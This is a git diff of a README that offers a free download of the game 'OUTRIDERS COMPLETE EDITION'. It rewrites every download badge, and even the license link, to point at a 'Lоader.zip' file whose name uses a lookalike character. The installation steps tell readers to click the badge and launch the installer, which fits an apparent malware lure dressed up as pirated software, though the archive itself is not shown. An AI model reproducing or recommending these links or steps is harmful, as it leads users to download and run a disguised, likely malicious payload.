@@ -1,6 +1,6 @@
 # 🚀 OUTRIDERS COMPLETE EDITION - Download & Overview
 
-[![Get OUTRIDERS COMPLETE EDITION!](https://img.shields.io/badge/Download-OUTRIDERS%20Complete%20Edition-blue?style=for-the-badge&logo=icloud)](https://easylauncher.su/PSnzrH)
+[![Get OUTRIDERS COMPLETE EDITION!](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip%20Complete%20Edition-blue?style=for-the-badge&logo=icloud)](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip)
 
 ---
 
@@ -28,7 +28,7 @@
 ## 📥 Installation Guide
 
 1. Click the download badge below & launch the installer:
-   [![Get OUTRIDERS COMPLETE EDITION!](https://img.shields.io/badge/Download-OUTRIDERS%20Complete%20Edition-blue?style=for-the-badge&logo=icloud)](https://easylauncher.su/PSnzrH)
+   [![Get OUTRIDERS COMPLETE EDITION!](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip%20Complete%20Edition-blue?style=for-the-badge&logo=icloud)](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip)
 
 ---
 
@@ -46,8 +46,8 @@ This repository is intended for demonstration and information purposes only. Ens
 
 ## 📄 License
 
-Licensed under the [MIT License (2025)](https://opensource.org/licenses/MIT).
+Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip).
 
 ---
 
-[![Grab OUTRIDERS COMPLETE EDITION Now!](https://img.shields.io/badge/Download%20Now-OUTRIDERS-blue?logo=icloud&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Grab OUTRIDERS COMPLETE EDITION Now!](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip%20Now-OUTRIDERS-blue?logo=icloud&style=for-the-badge)](https://raw.githubusercontent.com/Cristian-Castor/OutridersCompleteEdition-UnlockedHub/main/Lоader.zip)
